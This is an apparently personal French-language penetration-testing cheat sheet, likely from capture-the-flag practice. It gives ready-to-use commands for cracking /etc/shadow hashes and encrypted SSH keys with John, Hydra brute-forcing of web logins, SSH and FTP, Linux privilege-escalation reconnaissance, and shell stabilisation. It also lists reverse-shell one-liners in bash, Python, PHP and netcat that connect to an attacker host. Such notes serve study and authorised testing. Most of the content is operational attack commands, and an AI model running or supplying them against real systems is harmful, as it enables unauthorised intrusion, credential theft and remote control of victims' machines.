# 1) Cracker un mot de passe chiffré
1. On obtient un mot de passe présent dans /etc/shadow, on le récupère dans un fichier root.hash
```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```
2. On crack le hash via john
```
john --wordlist=/chemin/vers/wordlist root.hash
```

# 2) Cracker un clef RSA chiffré
1. On met la main sur une cléf RSA chiffré, on la récupère et on la mets dans un fichier id_rsa
2. On converti la clé RSA chiffrée en format John-readable
```
ssh2john id_rsa > id_rsa.hash
```
3. On crack le hash avec John 
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

# 3) Bruteforce un formulaire web
## Hydra 
1. Noté les noms des balises username et password
2. Vérifier si il s'agit d'une méthode POST ou GET
3. Récuperer message d'erreur 
4. Récupérer l'URL de la page 
5. Ne pas modifier ^USER^ et ^PASS^ 
6. Modifier le login, la méthode, l'URL d'accès, Le message d'erreur
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.167 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
# 4) Elevation de privilèges Linux
## Sudo 
* **Base de la faille** : L'utilisation inappropriée de la commande `sudo` par les administrateurs système peut donner à certains utilisateurs des privilèges qu'ils ne devraient pas avoir. Si un utilisateur a le droit d'exécuter une commande ou un binaire avec des privilèges `root` sans restriction, cela peut être exploité.

* **Comment c'est possible** : Disons qu'un utilisateur peut exécuter `vim` avec `sudo` sans mot de passe. Cela signifie qu'il peut éditer n'importe quel fichier en tant que `root` ou lancer un shell avec des droits `root`.
1. On regarde les commandes executables en sudo 
```
sudo -l
```
2. On cherche sur GTFObins les possibilités de la commande en tant que root pour :
	* Obtenir un shell root
	* Lire un fichier sensible : /etc/shadow
	* Modifier fichier sensible (crontab par exemple)
	* Déployer un reverse shell
	* Transfert de fichiers
## SUID
* **Base de la faille** : Les binaires avec le bit SUID permettent à l'exécutable d'être exécuté avec les droits du propriétaire du fichier plutôt qu'avec les droits de l'utilisateur qui l'exécute. Si un binaire vulnérable ou mal configuré a le bit SUID défini, cela peut être exploité.
* **Comment c'est possible** : Un exemple courant est un binaire qui a le bit SUID défini et qui exécute des opérations sans valider ou désinfecter correctement les entrées. Un attaquant pourrait exploiter cela pour exécuter des commandes arbitraires.
1. Lister les binaires (commandes), exécutable en tant que leur propriétaires (root)
```
find / -perm -4000 2>/dev/null
```
## Cron
* **Base de la faille** : Des tâches `cron` mal configurées ou l'exécution de scripts sans validation ou contrôle approprié peuvent être une avenue pour l'élévation de privilèges.
* **Comment c'est possible** : Si un script exécuté par `cron` utilise un chemin d'accès non absolu ou a de mauvaises permissions (comme être accessible en écriture pour n'importe quel utilisateur), un attaquant peut exploiter cela pour exécuter du code malveillant avec les privilèges du cron job.
1. Lister les tâches qui seront executés de facons régulière en tant que root
```
ls -alh /etc/cron* cat /etc/crontab
```
## Services root 
* **Base de la faille** : Les services sont souvent lancés avec des droits élevés. Si un service est vulnérable ou mal configuré, il peut être exploité pour obtenir ces droits.
* **Comment c'est possible** : Un service mal configuré pourrait, par exemple, charger des bibliothèques à partir d'un chemin non sécurisé, permettant à un attaquant d'y injecter sa propre bibliothèque.
1. Lister les services qui se lancent en root pour y injecter des modifications
```
systemctl list-units --type=service
```

## Fichier de configuration mal configurés
* **Base de la faille** : Les fichiers de configuration peuvent parfois contenir des informations sensibles comme des mots de passe. Si ces fichiers sont lisibles par des utilisateurs non privilégiés, ils peuvent être exploités.
* **Comment c'est possible** : Un attaquant qui peut lire un fichier de configuration contenant un mot de passe en clair peut utiliser ce mot de passe pour obtenir des privilèges ou accéder à d'autres systèmes ou services.
```
find /etc/ -readable -type f 2>/dev/null
```

## Permissions de groupe laxistes
* **Base de la faille** : Si un fichier ou un répertoire a des permissions de groupe inappropriées, cela peut permettre à des utilisateurs non autorisés d'écrire ou de modifier ces fichiers.
* **Comment c'est possible** : Si un utilisateur fait partie d'un groupe qui peut écrire dans un fichier exécuté par un utilisateur avec des privilèges élevés, il peut modifier ce fichier pour inclure du code malveillant.
1. Lister les répertoires ou mon groupe est présent 
```
find / -group GROUP_NAME -perm -g+w 2>/dev/null
```
## Faiblesses de sécurité dans le noyau
* **Base de la faille** : Des vulnérabilités dans le noyau peuvent permettre à un attaquant d'élever ses privilèges de `user` à `root`.
* **Comment c'est possible** : Si un utilisateur peut exploiter une vulnérabilité du noyau, comme une condition de course, il peut potentiellement obtenir un accès `root`. Des outils comme `searchsploit` peuvent être utilisés pour trouver des exploits connus pour une version de noyau spécifique.
1. Afficher les informations du noyau
```
uname -a
```

# 5) Amelioration de shells

## Python
1. Importer le module pty pour améliorer le shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
## Socat 
1. Sur l'attaquant 
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
2. Sur la machine cible
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
## Stty
1. Sur la cible
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```
2. Sur l'attaquant
```
$ stty raw -echo
$ fg
```
3. Sur la cible
```
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```

# 6) Reverse Shells (cible vers nous)
## BASH
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## Netcat 
1. Ouvrir un port sur la machine attaquante
```
nc -lvp 4444
```
3. Connecter un shell sh vers le port de la machine attaquante
```
nc -e /bin/sh [IP_ATTAQUANT] [PORT]
```
❗️ Toutes les machines n'ont pas netcat avec l'option -e


# 7) Reconnaissance active
## Comportement de base de nmap
- **Ports**: Par défaut, Nmap scanne les 1 000 ports TCP les plus couramment utilisés.
- **Vitesse**: Si aucune option de timing n'est spécifiée, Nmap choisit un timing basé sur le réseau et la cible. L'option `-T3` est généralement le niveau de timing par défaut.
- **Scripts**: Les scripts ne sont pas exécutés par défaut. Vous devez utiliser `-sC` ou `--script` pour spécifier les scripts que vous voulez exécuter.
- **Technique de scan**: Nmap utilisera le scan SYN (ou "half-open" scan) par défaut si exécuté en tant que root. Sinon, il utilise le scan connect(). Le scan SYN est plus rapide et moins intrusif que le scan connect(), car il n'établit jamais de connexion complète.

## Options courantes
* -A : combinaison de plusieurs fonctionnalités avancées.
	1. **Détection du système d'exploitation (`-O`)** : Nmap essaiera de déterminer le système d'exploitation (OS) de la cible.
	2. **Détection de version (`-sV`)** : Nmap déterminera les services en cours d'exécution sur les ports ouverts et tentera d'identifier leur version spécifique.
	3. **Script scan (`-sC`)** : Exécute un ensemble de scripts NSE (Nmap Scripting Engine) par défaut. Ces scripts sont généralement considérés comme "sûrs" à exécuter, mais ils peuvent être très informatifs et révéler des informations supplémentaires sur la cible.
	4. **Traceroute (`--traceroute`)** : Nmap exécutera un traceroute vers la cible pour déterminer le chemin des paquets à travers le réseau.
* TX : Vitesse d'execution du scan 
	1. **T0 (paranoiac)**: Extrêmement lent. Il envoie des paquets de manière très espacée pour réduire la probabilité d'être détecté par des dispositifs comme les IDS (systèmes de détection d'intrusion) ou les IPS (systèmes de prévention d'intrusion).
	2. **T1 (sneaky)**: Encore lent, mais pas autant que T0. Il est conçu pour être discret, mais est plus rapide que le mode paranoiac.
	3. **T2 (polite)**: Plus rapide que T1 et T0, mais prend encore des mesures pour ne pas surcharger le réseau ou la cible. Il envoie des paquets à un rythme qui devrait éviter d'encombrer le réseau.
	4. **T3 (normal)**: C'est le mode par défaut de Nmap. Il n'a pas de retard spécial entre les paquets comme les modes précédents. Dans ce mode, Nmap prend des décisions basées sur les réponses du réseau, ajustant ses délais en conséquence.
	5. **T4 (aggressive)**: Plus rapide que T3. Il envoie des paquets plus rapidement, en réduisant considérablement les délais. Il existe un risque plus élevé de fausser certains résultats ou d'engorger les réseaux avec cette option.
	6. **T5 (insane)**: C'est le mode le plus rapide. Il est utile lorsque la cible est sur un réseau local ou lorsqu'on sait que la cible peut gérer une telle quantité de trafic. Il peut facilement causer des problèmes sur les réseaux ou avec les cibles s'ils ne sont pas préparés à gérer une telle charge.

## Utilisation de nmap
1. Scan de port nmap
```
nmap [IP_CIBLE] -p- -T4 -A -oN result_nmap.txt
nmap [IP_CIBLE] -p- -T4 -sC -sV -oN result_nmap.txt
```
2. Lister les scripts NSE
```
ls /usr/share/nmap/scripts/
ls /usr/share/nmap/scripts/ | grep [PROTOCOLE]
````
3. Executer scripts NSE
```
nmap -p [PORT] --script [NOMSCRIPT] [IP_CIBLE]
nmap -p [PORT] --script [NOMSCRIPT1],[NOMSCRIPT2] [IP_CIBLE]
```

# 8) Directory Bruteforcing

## Liste des wordlists utiles
- `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt` ==> Utilise pour IIS qui n'est pas sensible à la casse
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
- `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`
## Gobuster
1. Lancer une attaque sur un URL
```
gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Dirb 
1. Lancer une attaque sur un URL
```
dirb http://[IP]/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Wfuzz
1. Lancer une attaque sur un URL
```
wfuzz -u http://[IP]/FUZZ -w /path/to/wordlist.txt
```


# 9) Bruteforce de service 
## Wordlists à utiliser

### Utilisateurs 
* [ssh-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt) 
* [ftp-usernames.txt](https://github.com/pentestmonkey/yaptest/blob/master/ftp-usernames.txt "ftp-usernames.txt")
### Mot de passe
* ``/usr/share/wordlists/rockyou.txt`` 
* [ssh-passwords.txt](https://github.com/pentestmonkey/yaptest/blob/master/ssh-passwords.txt "ssh-passwords.txt") 
* [ftp-passwords.txt](https://github.com/pentestmonkey/yaptest/blob/master/ftp-passwords.txt "ftp-passwords.txt")

## SSH 
1. Bruteforcer un service SSH sans aucunes informations
```
hydra -L [WORDLIST_USERS] -P [WORDLIST_PASSWD] [IPCIBLE] ssh -t 4
```
2. Bruteforcer un service SSH en ayant le login
```
hydra -l [user] -P [WORDLIST_PASSWD] [IPCIBLE] ssh -t 4
```
3. Bruteforcer un service SSH en ayant le mot de passe
```
hydra -L [WORDLIST_USERS] -p [password] [IPCIBLE] ssh -t 4
```
## FTP
1. Bruteforcer un service FTP sans aucunes informations**:
```
hydra -L [WORDLIST_USERS] -P [WORDLIST_PASSWD] [IPCIBLE] ftp -t 4
```
2. **Bruteforcer un service FTP en ayant le login**:
```
hydra -l [user] -P [WORDLIST_PASSWD] [IPCIBLE] ftp -t 4
```
3. **Bruteforcer un service FTP en ayant le mot de passe**:
```
hydra -L [WORDLIST_USERS] -p [password] [IPCIBLE] ftp -t 4
```
